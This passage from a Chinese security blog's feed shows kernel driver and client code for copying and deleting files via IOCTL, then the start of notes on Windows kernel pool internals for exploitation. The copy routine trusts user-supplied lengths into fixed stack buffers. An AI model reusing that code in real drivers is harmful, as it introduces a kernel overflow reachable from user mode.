&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4-Get Source File Size &amp; Allocate Transfer Buffer</span></span><br><span class="line">    FILE_STANDARD_INFORMATION StdFileInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    status = <span class="built_in">ZwQueryInformationFile</span>(hSrcFile, &amp;IoBlock, &amp;StdFileInfo, <span class="built_in">sizeof</span>(FILE_STANDARD_INFORMATION), FileStandardInformation);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Query File %wZ Failed, status: %x\n&quot;</span>, SrcFilePath, status);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;IoBlock size %d\n&quot;</span>, IoBlock.Information);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;StdFileInfo size %d\n&quot;</span>, StdFileInfo.EndOfFile.QuadPart);</span><br><span class="line"></span><br><span class="line">    PVOID Transfer = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_NON_PAGED, StdFileInfo.EndOfFile.QuadPart, <span class="string">&#x27;ymym&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (Transfer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;ExAllocatePool Transfer Buffer Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(Transfer, StdFileInfo.EndOfFile.QuadPart);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5-Read Source File To Buffer</span></span><br><span class="line">    LARGE_INTEGER TempReadCount = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    status = <span class="built_in">ZwReadFile</span>(hSrcFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Read to Transfer Buffer Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Io info: %d&quot;</span>, IoBlock.Information);</span><br><span class="line">    <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6-Create New File</span></span><br><span class="line">    status = <span class="built_in">ZwCreateFile</span>(&amp;hDstFile, GENERIC_ALL, &amp;DstFileAttribute, &amp;IoBlock, <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create File Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 7-Write to New File</span></span><br><span class="line">    status = <span class="built_in">ZwWriteFile</span>(hDstFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Write File Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hDstFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZwClose</span>(hDstFile);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Write %d\n&quot;</span>, IoBlock.Information);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Created New File %wZ\n&quot;</span>, DstFilePath);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3bbaf0ee5dc7ec78365d41efcecc1872.png" alt="image-20240317193310825" /></p><h1 id="优化到ioctl"><a class="markdownIt-Anchor" href="#优化到ioctl"></a> 优化到IOCTL</h1><h2 id="文件删除-2"><a class="markdownIt-Anchor" href="#文件删除-2"></a> 文件删除</h2><p>驱动</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelDeleteFile</span><span class="params">(PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG filePathLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">    </span><br><span class="line">    WCHAR filePath[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">// = pIrp-&gt;AssociatedIrp.SystemBuffer;</span></span><br><span class="line">    <span class="keyword">if</span> (filePathLen &gt;= <span class="number">0x1000</span>) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Size of file path is too big\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    UNICODE_STRING FilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(filePath, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(filePath, pIrp-&gt;AssociatedIrp.SystemBuffer, filePathLen);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;FilePath, filePath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Now Delete File %wZ\n&quot;</span>, FilePath);</span><br><span class="line"></span><br><span class="line">    OBJECT_ATTRIBUTES FileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;FileAttribute, &amp;FilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    status = <span class="built_in">ZwDeleteFile</span>(&amp;FileAttribute);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Delete Device Failed: %x\n&quot;</span>, status);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">KDeleteFile</span><span class="params">(HANDLE hDevice, <span class="type">const</span> <span class="type">wchar_t</span> filepath[])</span> </span>&#123;</span><br><span class="line">    DWORD info = <span class="number">0</span>;</span><br><span class="line">    std::wstring prefix = <span class="string">L&quot;\\??\\&quot;</span>;</span><br><span class="line">    std::wstring r3path = filepath;</span><br><span class="line">    r3path = prefix + r3path;</span><br><span class="line">    <span class="built_in">DeviceIoControl</span>(hDevice, IOCTL_DELETE_FILE, (LPVOID)r3path.<span class="built_in">c_str</span>(), (r3path.<span class="built_in">size</span>()) * <span class="number">2</span> - <span class="number">1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件复制-2"><a class="markdownIt-Anchor" href="#文件复制-2"></a> 文件复制</h2><p>驱动</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelCopyFile</span><span class="params">(PIRP pIrp)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0-Get Param</span></span><br><span class="line">    ParamKernelCopyFile Param = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR dstFile[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR srcFile[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(dstFile, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(srcFile, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>((PVOID)&amp;Param, pIrp-&gt;AssociatedIrp.SystemBuffer, <span class="built_in">sizeof</span>(ParamKernelCopyFile));</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>((PVOID)dstFile, Param.dstFile, Param.dstFileLen);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>((PVOID)srcFile, Param.srcFile, Param.srcFileLen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DbgPrint(&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1-Declear Related Variable</span></span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    UNICODE_STRING DstFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    UNICODE_STRING SrcFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DstFilePath, dstFile);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;SrcFilePath, srcFile);</span><br><span class="line">    IO_STATUS_BLOCK IoBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSrcFile = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hDstFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//----------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2-Init Related Variable</span></span><br><span class="line">    OBJECT_ATTRIBUTES DstFileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    OBJECT_ATTRIBUTES SrcFileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;DstFileAttribute, &amp;DstFilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;SrcFileAttribute, &amp;SrcFilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3-Open File</span></span><br><span class="line">    status = <span class="built_in">ZwOpenFile</span>(&amp;hSrcFile, GENERIC_ALL, &amp;SrcFileAttribute, &amp;IoBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Open File %wZ Failed, status: %x\n&quot;</span>, SrcFilePath, status);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4-Get Source File Size &amp; Allocate Transfer Buffer</span></span><br><span class="line">    FILE_STANDARD_INFORMATION StdFileInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    status = <span class="built_in">ZwQueryInformationFile</span>(hSrcFile, &amp;IoBlock, &amp;StdFileInfo, <span class="built_in">sizeof</span>(FILE_STANDARD_INFORMATION), FileStandardInformation);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Query File %wZ Failed, status: %x\n&quot;</span>, SrcFilePath, status);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PVOID Transfer = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_NON_PAGED, StdFileInfo.EndOfFile.QuadPart, <span class="string">&#x27;ymym&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (Transfer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;ExAllocatePool Transfer Buffer Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(Transfer, StdFileInfo.EndOfFile.QuadPart);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5-Read Source File To Buffer</span></span><br><span class="line">    LARGE_INTEGER TempReadCount = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    status = <span class="built_in">ZwReadFile</span>(hSrcFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Read to Transfer Buffer Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZwClose</span>(hSrcFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6-Create New File</span></span><br><span class="line">    status = <span class="built_in">ZwCreateFile</span>(&amp;hDstFile, GENERIC_ALL, &amp;DstFileAttribute, &amp;IoBlock, <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create File Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7-Write to New File</span></span><br><span class="line">    status = <span class="built_in">ZwWriteFile</span>(hDstFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Write File Failed, status: %x\n&quot;</span>, status);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(Transfer);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hDstFile);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZwClose</span>(hDstFile);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Created New File %wZ\n&quot;</span>, DstFilePath);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">KCopyFile</span><span class="params">(HANDLE hDevice, <span class="type">const</span> <span class="type">wchar_t</span> srcpath[], <span class="type">const</span> <span class="type">wchar_t</span> dstpath[])</span> </span>&#123;</span><br><span class="line">    ParamKernelCopyFile param = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD info = <span class="number">0</span>;</span><br><span class="line">    std::wstring prefix = <span class="string">L&quot;\\??\\&quot;</span>;</span><br><span class="line">    std::wstring SRC = srcpath;</span><br><span class="line">    std::wstring DST = dstpath;</span><br><span class="line">    SRC = prefix + SRC;</span><br><span class="line">    DST = prefix + DST;</span><br><span class="line"></span><br><span class="line">    param.dstFile = (PWCHAR)DST.<span class="built_in">c_str</span>();</span><br><span class="line">    param.srcFile = (PWCHAR)SRC.<span class="built_in">c_str</span>();</span><br><span class="line">    param.dstFileLen = DST.<span class="built_in">size</span>() * <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">    param.srcFileLen = SRC.<span class="built_in">size</span>() * <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    std::wcout &lt;&lt; <span class="string">L&quot;SRC Path &quot;</span> &lt;&lt; param.srcFile &lt;&lt; std::endl;</span><br><span class="line">    std::wcout &lt;&lt; <span class="string">L&quot;DST Path &quot;</span> &lt;&lt; param.dstFile &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">DeviceIoControl</span>(hDevice, IOCTL_COPY_FILE, (LPVOID)&amp;param, <span class="built_in">sizeof</span>(param), <span class="literal">NULL</span>, <span class="number">0</span>, &amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="更好的文件复制"><a class="markdownIt-Anchor" href="#更好的文件复制"></a> 更好的文件复制</h2><p>复制的时候使用内存大小，但是内核内存还是得节省着用，而且大文件可能会整数溢出</p><p>写个write的循环就行了</p><p>但是想了想涉及到文件追加啥的，我是懒狗</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前写过：&lt;a href=&quot;https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/&quot;&gt;windows内核驱动 1-环境搭建&lt;/a&gt;、&lt;a href=&quot;https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/&quot;&gt;windows内核驱动 2-页表探索&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是内容确实有点衔接不上，这里根据&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&quot;&gt;【Win Pwn】HEVD-内核栈溢出(上)&lt;/a&gt;中展示的基础技巧来继续&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】Windows内核池笔记</title>
    <link href="https://joe1sn.eu.org/2024/03/17/win-kernel-pool/"/>
    <id>https://joe1sn.eu.org/2024/03/17/win-kernel-pool/</id>
    <published>2024-03-17T01:43:37.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>文章来自blackhat 2021的文章《Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded》</p><p>原文链接：<a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf</a></p><p>Youtube：<a href="https://www.youtube.com/watch?v=VvxNc8GTFfk">https://www.youtube.com/watch?v=VvxNc8GTFfk</a></p><span id="more"></span><h1 id="粗略的分配"><a class="markdownIt-Anchor" href="#粗略的分配"></a> 粗略的分配</h1><p>内核动态内存：和R3中的对差不多</p><p>类型为可分页和不可分页，程序按照4KB分页，之前写过一点相关的：<a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">Joe1sn’s Cabinet | windows内核驱动 2-页表探索</a></p><p>旧API初始化中不会将内存置零，导致信息泄露</p><p>一些API</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f1d91b71f507bed8db8d8849de7e6bff.png" alt="image-20240317095459904" /></p><p>在RS5（Redstone 5）版本前（及Windows 1809，在2018年10月前的版本）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f364e47d4cdcab7796144a5b39a53f85.png" alt="image-20240317095835831" /></p><p>没有任何校验、加密等等，但是之后就变得复杂得多了（严重怀疑微软借鉴了glibc的内存管理）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/170fbb2877774bded875232a3a8c3128.png" alt="image-20240317100321871" /></p><ul><li>新版本的池设计管理和R3下是同一个库</li><li><strong>每一个独立的池由<code>SEGMENT_HEAP</code>结构体管理</strong>，后文简写为<code>SEG_HEAP</code></li><li>池的申请根据其大小进行不同的处理<ul><li>不同大小申请机制不同</li><li>大内存池仍然由<code>VA</code>管理</li></ul></li></ul><p><strong>SEGMENT_HEAP</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0x000</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> GlobalFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Interceptor      : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessHeapListIndex : Uint2B</span><br><span class="line">   +<span class="number">0x01e</span> AllocatedFromMetadata : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x020</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +<span class="number">0x020</span> ReservedMustBeZero1 : Uint8B</span><br><span class="line">   +<span class="number">0x028</span> UserContext      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedMustBeZero2 : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> Spare            : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> LargeMetadataLock : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x058</span> LargeReservedPages : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> LargeCommittedPages : Uint8B</span><br><span class="line">   +<span class="number">0x068</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS</span><br><span class="line">   +<span class="number">0x0d8</span> GlobalLockCount  : Uint2B</span><br><span class="line">   +<span class="number">0x0dc</span> GlobalLockOwner  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> ContextExtendLock : Uint8B</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure><p>文章选了一些重点来</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ed29af21efa3768777ad12bffd6c222e.png" alt="image-20240317101151659" /></p><p>根据上图缩略结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">  ....</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">  ....</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS<span class="comment">//大内存页状态</span></span><br><span class="line">  ....</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar<span class="comment">//已分配内存</span></span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar<span class="comment">//未提交内存</span></span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT<span class="comment">//VS类型堆管理链表</span></span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT<span 